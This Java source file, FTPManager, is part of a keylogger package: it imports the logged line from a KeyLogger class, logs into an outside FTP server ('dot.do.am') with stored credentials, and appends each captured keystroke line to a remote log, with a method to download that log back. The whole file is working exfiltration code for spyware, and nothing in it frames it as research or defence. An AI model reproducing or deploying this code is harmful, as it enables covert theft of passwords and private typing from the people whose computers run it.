package org.dot;
import static org.dot.Constants.LOGIN;
import static org.dot.Constants.LOG_LOCAL;
import static org.dot.Constants.LOG_REMOTE;
import static org.dot.Constants.PASSWORD;
import static org.dot.KeyLogger.LINE;

import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.io.OutputStream;

import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;

public class FTPManager {

	public static FTPClient ftp = new FTPClient();
	
	private FTPManager() {}
	
	public static boolean connect() throws Exception {
		ftp.connect("dot.do.am");
		ftp.enterLocalPassiveMode();
		ftp.enterRemotePassiveMode();
		return ftp.login(LOGIN, PASSWORD);
	}
	
	public static boolean upload() throws Exception {
		System.out.println("Writing line \"" + LINE + "\"");
		
		OutputStream out = ftp.appendFileStream(LOG_REMOTE);
		out.write(LINE.getBytes("UTF-8"));
		out.close();
		
		return ftp.completePendingCommand();
	}
	
	public static boolean download() throws Exception {
		OutputStream out = new BufferedOutputStream(new FileOutputStream(LOG_LOCAL, true));;
		try {
			ftp.setFileType(FTP.BINARY_FILE_TYPE);
			return ftp.retrieveFile(LOG_REMOTE, out);
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			out.close();
		}
		return false;
	}
}
